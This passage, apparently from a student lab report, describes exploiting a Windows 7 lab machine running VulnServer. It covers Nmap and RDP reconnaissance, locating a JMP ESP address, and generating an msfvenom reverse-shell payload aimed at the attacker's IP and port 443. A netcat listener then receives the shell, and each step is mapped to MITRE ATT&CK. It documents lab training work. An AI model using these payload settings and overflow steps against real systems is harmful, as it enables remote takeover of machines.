\subsection{Windows Scanning and Buffer Overflow}

\subsubsection{Nmap Scan} \label{subsec:Nmap_scan}
The Active Scanning technique (T1595) (Reconnaissance (TA0043) tactic \autocite{mitre:attack:TA0043}) was utilized via Nmap to gather information about the target system \autocite{mitre:attack:T1595}.\\
The goal of the Nmap scan was to obtain information about the operating system, open ports, service information, and vulnerabilities on the target system:

\paragraph{Scan Setup} \label{bo:scan-setup}
To achieve this, the following Nmap parameters were used:
\begin{figure}[h]
\makebox[1.05\linewidth][c]{%
	\includegraphics[width=1.1\linewidth]{../img/buffer_overflow/nmap/flags}
}
	\vspace*{-5mm}
	\caption{Nmap - Configuration used to scan the target system}
\end{figure}\\
The parameters were chosen with the following reasoning \autocite{nmap}:
\vspace{-2mm}
\begin{itemize}
\item[-]{\textbf{T4}}\\
Sets the timing template. In this case, the second fastest scanning mode was chosen.
Since this scan happened in a laboratory setting, a stealthier (slower) option was not necessary.
\item[-]{\textbf{O}}\\
Enables OS detection, provides information about the target machine’s operating system.
\item[-]{\textbf{p-}}\\
Instructs Nmap to scan the complete port range to discover open ports on the target machine.
\item[-]{\textbf{sV}}\\
Instructs Nmap to scan for services and their versions on open ports.
\item[\texttt{--}]{\textbf{script}=\enquote{default,vuln}}\\
Executes the default non-intrusive general and vulnerability scripts during the scan. 
\item[-]{\textbf{Pn}}\\
This flag instructs Nmap to treat all hosts as online, skipping the ICMP ``ping" Nmap would otherwise perform before scanning the system.
It was known that the target was a Windows machine, which don't answer pings by default. Therefore, Nmap would assume the host was down if this flag weren’t set, ending the scan prematurely.
\item[-]{\textbf{v}}\\
Sets the output to ``verbose". This was chosen to see results immediately as they were found, enabling work on the already discovered information without having to wait for the whole scan to finish.
\item[-]{\textbf{oN} nmap.txt}\\
Writes the output to the file ``nmap.txt" in normal mode to record the scan results.
\item[-]{192.168.61.45}\\
The IP adress of the target machine that was to be scanned.
\end{itemize}

\begin{enumerate}
\item{\textbf{Port 445 - Windows 7 Enterprise 7601 Service Pack 1 microsoft ds}}\\
Nmap was able to identify the service running on port 445 as ``microsoft-ds".\\
The directory service (``ds") running here is common for port 445, implying that the SMB (Server Message Block) protocol is being used. \enquote{The SMB protocol is a network file sharing protocol. SMB allows you to read and write to files over the network on top of TCP/IP or other protocols} \autocite{microsoft:smb_feature_descriptions}.

\item{\textbf{Port 3389 - tcpwrapped}}\\
Nmap returning \enquote{tcpwrapped} means the TCP handshake was completed, but that the connection was closed by the host immediately without transmitting further data \autocite{venema1992tcp}. 
A service running on port 3389 usually is Microsoft's Remote Desktop Service \autocite{microsoft:rds_ports}.

\item{\textbf{Port 5555 - Service unrecognized}}\\
Nmap could not infer the service running on port 5555.
The closest fingerprint match it got is ``freeciv", a program that seems to be identified on port 5555 commonly by Nmap according to multiple user reports \autocite{samsepi0l:android4_vulnhub_writeup, nmap:issue1276, fahmifj:htb_explore_writeup}, even though it is not actually running on the port.

The two following lines returned by the service can be gathered from the fingerprint:\\
- \textit{``Hello There.\textbackslash r\textbackslash n"}\\
- \textit{``I break rules too!\textbackslash r\textbackslash n"}

All that can be gleamed from this scan result is that a service is running on port 5555 that returns text when called.

\end{enumerate}

FreeRDP is an open source tool preinstalled on Kali Linux that allows users to connect to systems via Remote Desktop protocol. In this case, an actual session will not be established, instead the software will be used to probe the target machine.
The parameters were chosen with the following reasoning \autocite{freerdp:manual}:
\begin{itemize}
\item[/]{\textbf{sec}:rdp}\\
Sets the protocol to Microsoft's Remote Desktop Protocol, which is suspected to be running on port 3389.
\item[/]{\textbf{v}:192.168.61.45:3389}\\
Provides FreeRDP with the target machine's IP and the port to connect to.
\item[/]{\textbf{u}:}\\
Leaves the user empty, since we are just probing to see if the service is running at all.
\end{itemize}

The connection attempt was successful, since a response was received. This confirms the suspicion that some Remote Desktop service is running on the open port. To determine the service version, another attempt to scan with nmap was made.

\begin{itemize}

\item[-]{\textbf{oN} nmap-3389.txt}\\
Writes to a separate new file, to collect the scan results.
\item[-]{\textbf{O}}\\
Omitted, since the OS information already gathered seemed conclusive enough.
\end{itemize}

The second scan confirms that Microsoft's Terminal Service (renamed to Remote Desktop service after Windows 7) \autocite{microsoft:rds} is running on port 3389.

Results from the vulnerability scan (see \fullref{sec:vuln_scan}) show that the service running on port 445 appears to be a Microsoft SMBv1 server.

\paragraph{Finding JMP ESP instruction}
To inject a payload carrying malicious code that creates a reverse shell, a reliable way of executing the reverse shell instructions was needed.
To instruct the host system to run the payload code, it must jump to the injected code and execute it.
Since the buffer is filled by the input sent to the target machine, and the ESP points to the top of the stack, the ESP will point to the injected code. Instruct the system to jump to the ESP would therefore lead to it executing the payload.
This can be achieved by writing the memory address of a JMP ESP instruction to the EIP, since it stores the address of the next instruction the system should execute after the current method returns.

First, the Opcode for JMP ESP needs to be determined.
The NASM shell, which shows opcodes for instructions on x86 systems \autocite{github:nasm_shell}, shows the JMP ESP opcode to be \textbf{0xFF 0xE4} (see \cref{4_jmp_esp_opcode}).

\begin{figure}[htb]
	\centering
	\includegraphics[height=3cm]{../img/buffer_overflow/vulnServ/4_jmp_esp_opcode.png}
	\caption{Opcode determination}
	\label{4_jmp_esp_opcode}
\end{figure}

Now an address in memory storing this opcode could be searched for.
The first approach to find such an address would be to use the debuggers \enquote{Search for Command} feature in the thread that gets interrupted by attaching the debugger to the process.
The following memory address containing a JMP ESP instruction was found during the first search attempt (see \cref{jmp_found}):
\vspace{-2mm}
\begin{center}
	\setlength{\fboxsep}{6pt}
	\fbox{\large \textbf{0x 77 90 E8 71}}
\end{center}

\begin{figure}[!htb]
	\centering
	\includegraphics[width=1.054\linewidth]{../img/buffer_overflow/pre_restart/jmp_found.png}
	\caption{Found JMP ESP instruction in the paused thread}
	\label{jmp_found}
\end{figure}

Upon restarting the target machine, this JMP ESP instruction was not located at the same memory address anymore. It was now stored at the following address (see \cref{jmp_found_post}):
\vspace{-2mm}
\begin{center}
	\setlength{\fboxsep}{6pt}
	\fbox{\large \textbf{0x 76 E4 E8 71}}
\end{center}

\begin{figure}[htb]

	\caption{Found JMP ESP instruction in the paused thread post restart}

The address discovered via the \enquote{Search For} feature was inside the memory space of a non-main thread (see \cref{wrong_thread}), meaning the location in memory would change across restarts since the thread will be opened anew by the process with differently allocated memory \autocite{microsoft:threads_in_stack}.
\begin{figure}[htb]

\\This address stops working in the attack after a machine restart (see \textit{\hyperref[Appendix-1]{Appendix}}, \cref{fail_start} - \cref{fail_end}). To perfect the attack, an address holding the JMP ESP command was necessary, which persisted beyond reboots.
This instruction could be located within the address space of any accessible module. The command \textit{!mona modules} \autocite{mona} was used to list them (see \cref{modules}).

The instruction inside an accessible module needs to meet the following criteria: \vspace{-4mm}
\begin{itemize}
\item{\textbf{No ASLR}}\\
Memory addresses cannot be randomized inside the module to make accessing the JMP ESP instruction reliable.
\item{\textbf{No DEP}}\\
If memory is marked as non-executable, using the JMP ESP instruction wouldn't work, even if such an instruction were present.
\end{itemize}

The  vulnerable server process itself (\textit{VulnServer.exe}) had both ASLR and DEP not enabled, (see \cref{modules_zoomed}, a zoomed-in cutout of \cref{modules}).

\begin{figure}[htb]
	\centering
	\includegraphics[width=\linewidth]{../img/buffer_overflow/overflow/modules_zoomed.png}

\paragraph{Generating and encoding payload}
After determining the offset, the bad characters and the address of the JMP ESP command a payload could be generated to create a reverse shell on the host system.

First, an encoder needed to be selected (see \cref{5_encoder_selection}).

\begin{figure}[htb]
	\centering

}
	\caption{Encoder options}
	\label{5_encoder_selection}
\end{figure}

An encoder from the highest ranked results was selected (\enquote{excellent} rank) by grepping for them.\\
Since the payload was not to be injected in a powershell environment, \textit{x86/shikata\_ga\_nai} was chosen.

To create the payload, the IP address of the attacker machine needed to be determined via the console command \textbf{ip a | grep tun0}.\\
The relevant interface is \textit{tun0}, the virtual network interface the attacker machine is tunneling into the laboratory through, since the target machine is part of the laboratory network.

\begin{figure}[htb]
\makebox[1.02\linewidth][c]{%
	\includegraphics[width=\linewidth]{../img/buffer_overflow/payload/0_ip.png}
}
	\caption{IP address in the ICS laboratory network}
	\label{ip}
\end{figure}

The IP address was determined to be \textbf{10.0.61.7} during the assignment (see \cref{ip}).\\
The payload to create a reverse shell on the target system was generated with the chosen encoder and the determined IP address (see \cref{1_payload_generation}).

\begin{figure}[htb]
	\centering
	\makebox[1.02\linewidth][c]{%
		\includegraphics[width=1.15\linewidth, height=5.5cm]{../img/buffer_overflow/payload/1_payload_generation.png}
	}
	\caption{Payload generation via msfvenom}
	\label{1_payload_generation}
\end{figure}

The parameters were chosen with the following reasoning \autocite{msfvenom}:
\begin{itemize}
\item[-]{\textbf{p} windows/shell\_reverse\_tcp}\\
Metasploit provides a payload that establishes a TCP connection to the attacker on a windows machine, which was chosen here.
\item[-]{\textbf{LHOST}=10.0.61.7}\\
Provides the IP address of the attacking system, enabling the script to establish the connection via TCP to that system to send the packets for the reverse shell via the network.
\item[-]{\textbf{LPORT}=443}\\
The port on the attacking system on which netcat will be listening for the incoming reverse shell connection attempt.
\item[-]{\textbf{EXITFUNC}=thread}\\
Prevents a crash when disconnecting by starting a thread on the target system for the reverse shell.
\item[-]{\textbf{a} x86}\\
Sets the target system's architecture (32 bit) to generate the appropriate code. 
\item[\texttt{--}]{\textbf{platform} windows}\\
Sets the target system's platform to generate the appropriate code.
\item[-]{\textbf{b} "\textbackslash x00"}\\
Sets the bad characters that will not be included in the generated code.
\item[-]{\textbf{n} 16}\\
Inserts 16 NOOP opcodes to provide space for the decoder, to prevent it from overwriting the paylod itself.
\item[-]{\textbf{e} x86/shikata\_ga\_nai}\\
Selects the chosen encoder.
\item[-]{\textbf{f} py}\\
Sets the output format to \textit{python}, to enable the code to be easily pasted into the script.
\item[-]{\textbf{o} payload.txt}\\
Saves the ouput to the specified file.
\end{itemize}

It should be noted, that an outbound connection to port 443 might not be typical for the server that is being attacked. Since this was being done in a laboratory environment, no analysis was done to determine the port that would arouse the least suspicion.
Before starting the attack, a listener for the reverse shell was created via netcat on the attacking machine (see \cref{2_start_reverse_shell}).

	\centering
	\includegraphics[height=2cm]{../img/buffer_overflow/payload/2_start_reverse_shell.png} \\
	\caption{Starting a reverse shell listener via netcat}
	\label{2_start_reverse_shell}
\end{figure}

The parameters for netcat were chosen with the following reasoning \autocite{nmap:ncat}:
\begin{itemize}
\item[-]{\textbf{l}}\\
Starts \enquote{listener} mode, listening for incoming connections.
\item[-]{\textbf{v}}\\
Puts netcat into verbose mode, showing the status of the listener on the console.
\item[-]{\textbf{p} 443}\\
Tells netcat to listen on port 443, the port we are establishing the connection to in our generated payload via the option \textit{LPORT=443} (see \cref{1_payload_generation}).
\end{itemize}

\paragraph{Decoding payload and creating reverse shell}
To facilitate the final attack, the script was altered the following way (see \cref{payload_script}):
\begin{figure}[!htb]
	\centering
	\includegraphics[width=\linewidth]{../img/buffer_overflow/overflow/payload_script.png} \\
	\caption{Script configuration to send payload to the vulnerable server}
	\label{payload_script}
\end{figure}
\vspace{-8mm}
\begin{itemize}
\item{\textbf{get\_payload()}}\\
This method returns the string representation of the payload generated with msfvenom (see \cref{payload_bytes}).
\item{\textbf{\enquote{\textbackslash x71 \textbackslash x1D \textbackslash xD1 \textbackslash x65}}}\\
The previously determined memory address holding the JMP ESP instruction.
It is in reverse byte order, since Windows 7 uses "Little Endian" byte ordering, storing the least significant byte at the smallest address, therefore reading the address right to left \autocite{microsoft:little_endian}.\\
The attack was also done twice more with the discovered memory addresses which were impermanent across restarts, to show them not working anymore after a reboot (see \textit{\hyperref[Appendix-1]{Appendix}}, \cref{private_vpn1} - \cref{reverse_foreign}).
\end{itemize}

Upon executing the attack, the following happened:
\vspace{-3mm}
\begin{enumerate}
\item{\textbf{Overwriting the EIP}}\\
After the determined offset of 1040 bytes, which the script filled with \enquote{A}s, the EIP got overwritten with the address that reliably contained the JMP ESP command. The input wasn't terminated at any point during processing, since any bad characters had been omitted in payload generation.
\item{\textbf{Jumping to the top of the stack}}\\
Upon returning (RETN), the JMP ESP instruction was executed.
The payload got decoded, the injected NOP-padding ensured the payload wouldn't get overwritten during the decoding process.
The decoded malicious code got executed after decoding had finished . 
\item{\textbf{Reverse shell creation}}\\
The payload initiated a connection to the attacking system, which had the netcat listener waiting on an incoming connection (see \cref{reverse_shell}). 
\end{enumerate}

\begin{figure}[!htb]
	\makebox[1.02\linewidth][c]{%
	\includegraphics[width=1.1\linewidth]{../img/buffer_overflow/overflow/reverse_shell.png}
	}
	\caption{Reverse shell established}
	\label{reverse_shell}
\end{figure}

This finalized attack was used to \enquote{Exploit Public-Facing Application (T1190)} \autocite{mitre:attack:T1190}, in order to get \enquote{Initial Access (TA0001)} \autocite{mitre:attack:TA0001} to the target system. The public facing VulnerServer application was exploited to get a payload onto the system.

\enquote{Execution (TA0002)} \autocite{mitre:attack:TA0002} of the payload happened because the unprotected buffer was exploited, which is categorized as \enquote{Exploitation for Client Execution (T1203)} \autocite{mitre:attack:T1203}. 
Arbitrary code was executed by the target machine because of the exploited vulnerability.

\enquote{Command and Control (TA0011)} \autocite{mitre:attack:TA0101} was then established to the attacking machine via \enquote{Application Layer Protocol (T1071)} \autocite{mitre:attack:T1071}.
The chosen payload \enquote{windows/shell\_reverse\_tcp} used a TCP connection to connect to port 443 on the attacker machine, which could appear as an outbound connection to a webserver.

The reverse shell served as a \enquote{Command and Scripting Interpreter: Windows Command Shell (T1059.003)} \autocite{mitre:attack:T1059.003} enabling the attacker to take over the host system via reverse shell, which was opened by the injected payload.

The scope of the assignment ended at this point, not requiring further privilege escalation, lateral movement, or exploitation of any kind. Access via reverse shell on the system is a dangerous attack vector, since the attacker gets interactive control over the target machine. Mitigation, Detection and Defense Strategies and countermeasures are discussed in \fullref{buff:vulns}.
